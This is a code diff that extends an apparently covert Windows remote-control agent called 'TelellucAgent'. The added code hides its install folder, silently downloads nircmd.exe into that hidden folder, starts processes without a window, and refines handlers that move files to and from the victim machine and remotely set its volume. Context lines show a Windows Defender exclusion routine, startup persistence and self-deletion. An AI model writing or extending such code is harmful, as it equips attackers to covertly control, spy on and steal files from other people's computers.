@@ -84,6 +84,54 @@ SWP_SHOWWINDOW = 0x0040
 
 
 
+def ensure_nircmd():
+    nircmd_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent", "nircmd.exe")
+    if os.path.exists(nircmd_path):
+        return nircmd_path
+
+    try:
+        nircmd_dir = os.path.dirname(nircmd_path)
+        os.makedirs(nircmd_dir, exist_ok=True)
+        try:
+            subprocess.run(
+                f'attrib +h "{nircmd_dir}"',
+                shell=True,
+                capture_output=True,
+                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+            )
+        except:
+            pass
+        print("[nircmd] Downloading nircmd.exe...", flush=True)
+        nircmd_url = "https://www.nirsoft.net/utils/nircmd.zip"
+        zip_path = os.path.join(os.path.dirname(nircmd_path), "nircmd.zip")
+
+        req = urllib.request.Request(nircmd_url, headers={"User-Agent": USER_AGENT})
+        with urllib.request.urlopen(req, timeout=30) as response:
+            with open(zip_path, "wb") as f:
+                f.write(response.read())
+
+        import zipfile
+        with zipfile.ZipFile(zip_path, "r") as zip_ref:
+            for file in zip_ref.namelist():
+                if file.endswith("nircmd.exe"):
+                    zip_ref.extract(file, os.path.dirname(nircmd_path))
+                    extracted = os.path.join(os.path.dirname(nircmd_path), file)
+                    if os.path.exists(extracted):
+                        shutil.move(extracted, nircmd_path)
+                        break
+
+        try:
+            os.remove(zip_path)
+        except:
+            pass
+
+        print("[nircmd] Downloaded successfully", flush=True)
+        return nircmd_path
+    except Exception as e:
+        print(f"[nircmd] Failed to download: {e}", flush=True)
+        return None
+
+
 def add_windows_defender_exclusion():
     try:
         import ctypes
@@ -170,7 +218,7 @@ def ensure_startup():
 
             if os.path.exists(startup_exe) and os.path.exists(source_exe) and os.path.abspath(source_exe) != os.path.abspath(startup_exe):
                 try:
-                    if os.path.getmtime(startup_exe) >= os.path.getmtime(source_exe):
+                    if os.path.getmtime(startup_exe) > os.path.getmtime(source_exe):
                         try:
                             subprocess.Popen(
                                 [startup_exe],
@@ -211,6 +259,12 @@ def self_delete_agent(trigger_id):
         if path and os.path.exists(path):
             candidates.append(os.path.abspath(path))
 
+    try:
+        if os.path.exists(local_dir):
+            shutil.rmtree(local_dir, ignore_errors=True)
+    except:
+        pass
+
     batch_lines = [
         "@echo off",
         "setlocal EnableDelayedExpansion",
@@ -234,7 +288,10 @@ def self_delete_agent(trigger_id):
         "shift",
         "goto loop",
         ":cleanup",
+        f"attrib -h \"{local_dir}\" 2>nul",
+        f"timeout /t 1 /nobreak >nul",
         f"rmdir /s /q \"{local_dir}\" 2>nul",
+        f"if exist \"{local_dir}\" rmdir /s /q \"{local_dir}\" 2>nul",
         "del /f /q \"%temp%\\telelluc*.bat\" 2>nul",
         "del /f /q \"%temp%\\telelluc*.vbs\" 2>nul",
         "exit /b 0",
@@ -293,6 +350,17 @@ def show_error():
     _force_topmost()
 
 
+def format_size(bytes_size):
+    if bytes_size < 1024:
+        return f"{bytes_size}B"
+    elif bytes_size < 1024 * 1024:
+        return f"{bytes_size / 1024:.1f}KB"
+    elif bytes_size < 1024 * 1024 * 1024:
+        return f"{bytes_size / (1024 * 1024):.1f}MB"
+    else:
+        return f"{bytes_size / (1024 * 1024 * 1024):.1f}GB"
+
+
 def execute_shell_command(cmd_str):
     global current_working_dir
     global clipboard_file
@@ -322,15 +390,26 @@ def execute_shell_command(cmd_str):
         if cmd_lower.startswith("dir") or cmd_lower == "ls":
             try:
                 os.chdir(current_working_dir)
-                result = subprocess.run(
-                    "dir",
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=10,
-                    cwd=current_working_dir
-                )
-                output = result.stdout.strip() if result.stdout else "Directory is empty"
+                items = []
+                try:
+                    for item in sorted(os.listdir(current_working_dir)):
+                        full_path = os.path.join(current_working_dir, item)
+                        try:
+                            if os.path.isdir(full_path):
+                                items.append(f"<DIR>  {item}")
+                            else:
+                                size = os.path.getsize(full_path)
+                                size_str = format_size(size)
+                                items.append(f"{size_str:>10}  {item}")
+                        except:
+                            items.append(f"?  {item}")
+                except Exception as e:
+                    return f"Error: {str(e)}"
+
+                if not items:
+                    return "Directory is empty"
+
+                output = "\n".join(items)
                 lines = output.split("\n")
                 if len(lines) > 110:
                     more_count = len(lines) - 100
@@ -434,11 +513,15 @@ def execute_shell_command(cmd_str):
         # Handle upload command
         if cmd_lower.startswith("__upload__:"):
             try:
-                parts = cmd_str.split(":", 2)
+                parts = cmd_str.split("|", 2)
                 if len(parts) < 3:
                     return "Error: Invalid upload command"
                 filepath = parts[1].strip()
                 file_content_b64 = parts[2]
+
+                file_size = len(file_content_b64) * 0.75
+                if file_size > 10 * 1024 * 1024:
+                    return f"Error: File too large. Maximum is 10MB"
 
                 import base64
                 try:
@@ -450,7 +533,7 @@ def execute_shell_command(cmd_str):
                 os.makedirs(os.path.dirname(full_path), exist_ok=True)
                 with open(full_path, "wb") as f:
                     f.write(file_content)
-                return f"File uploaded: {os.path.basename(filepath)}"
+                return f"File uploaded: {os.path.basename(full_path)}"
             except Exception as e:
                 return f"Error: {str(e)}"
 
@@ -463,6 +546,11 @@ def execute_shell_command(cmd_str):
                     return f"Error: File not found: {filename}"
                 if os.path.isdir(full_path):
                     return f"Error: {filename} is a directory"
+
+                file_size = os.path.getsize(full_path)
+                if file_size > 10 * 1024 * 1024:
+                    size_mb = file_size / (1024 * 1024)
+                    return f"Error: File too large ({size_mb:.1f}MB). Maximum is 10MB"
 
                 import base64
                 with open(full_path, "rb") as f:
@@ -659,6 +747,58 @@ def execute_shell_command(cmd_str):
                 return f"Volume set to {level}%"
             except ValueError:
                 return "Error: Volume level must be a number between 0 and 100"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle start command (asynchronous)
+        if cmd_lower.startswith("start "):
+            target = cmd_str[6:].strip().strip('"').strip("'")
+            try:
+                subprocess.Popen(
+                    f'start "" "{target}"',
+                    shell=True,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    cwd=current_working_dir,
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+                )
+                return f"Process started: {target}"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle max_audio command
+        if cmd_lower == "max_audio":
+            try:
+                nircmd_path = ensure_nircmd()
+                if not nircmd_path:
+                    return "Error: Could not download nircmd"
+                result = subprocess.run(
+                    [nircmd_path, "setsysvolume", "65535"],
+                    capture_output=True,
+                    timeout=5,
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+                )
+                if result.returncode == 0:
+                    return "Volume: 100%"
+                return "Error: Failed to set volume"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle min_audio command
+        if cmd_lower == "min_audio":
+            try:
+                nircmd_path = ensure_nircmd()
+                if not nircmd_path:
+                    return "Error: Could not download nircmd"
+                result = subprocess.run(
+                    [nircmd_path, "setsysvolume", "0"],
+                    capture_output=True,
+                    timeout=5,
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+                )
+                if result.returncode == 0:
+                    return "Volume: 0% (muted)"
+                return "Error: Failed to set volume"
             except Exception as e:
                 return f"Error: {str(e)}"
 
